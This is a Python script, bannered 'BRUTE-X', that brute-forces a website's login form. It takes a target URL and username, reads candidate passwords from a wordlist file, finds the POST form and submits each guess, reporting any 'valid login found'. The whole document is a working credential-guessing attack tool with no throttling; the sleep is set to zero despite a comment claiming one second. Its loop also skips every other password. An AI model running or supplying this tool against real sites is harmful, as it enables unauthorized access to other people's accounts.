import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time
from colorama import Fore, Style  # Import colorama for terminal color

# Initialize colorama
Fore.BLUE, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL

print("""


██████╗ ██████╗ ██╗   ██╗████████╗███████╗              ██╗  ██╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝              ╚██╗██╔╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗      █████╗     ╚███╔╝ 
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ╚════╝     ██╔██╗ 
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗              ██╔╝ ██╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝              ╚═╝  ╚═╝
                                                                


""")


# Get the login page URL and username from the user input
login_page_url = input(f"{Fore.BLUE}Enter the login page URL: {Style.RESET_ALL}")
username = input(f"{Fore.BLUE}Enter the username: {Style.RESET_ALL}")

# Get the wordlist file path from the user input
wordlist_file_path ="wordlist.txt"

# Read the wordlist from the provided file
with open(wordlist_file_path, 'r') as f:
    wordlist = [line.strip() for line in f.readlines()]

# Fetch the content of the login page
response = requests.get(login_page_url)
page_content = response.content

# Parse the HTML content using BeautifulSoup
soup = BeautifulSoup(page_content, 'html.parser') 

# Find the login form element and extract the action URL
login_form = soup.find('form', method='POST')
if login_form:
    login_action = login_form.get('action')
    login_url = urljoin(login_page_url, login_action)
else:
    print(f"{Fore.RED}Login form not found.{Style.RESET_ALL}")
    exit()

# Iterate through the wordlist and try login
for i in range(0, len(wordlist), 2):
    password = wordlist[i]
    data = {'username': username, 'password': password}
    response = requests.post(login_url, data=data)
    print(f"{Fore.YELLOW}Trying Password: {password} ")
    try:
        response_json = response.json()
        if response_json.get("success"):
            print(f"{Fore.GREEN}Valid login found: {username}:{password}{Style.RESET_ALL}")
            break
    except:
        if "Welcome" in response.text:
            print(f"{Fore.GREEN}Valid login found: {username}:{password}{Style.RESET_ALL}")
            break
    
    print(f"{Fore.RED}Password : {password} - NOT MATCH")
    print("")
    time.sleep(0)  # add a delay of 1 second between requests
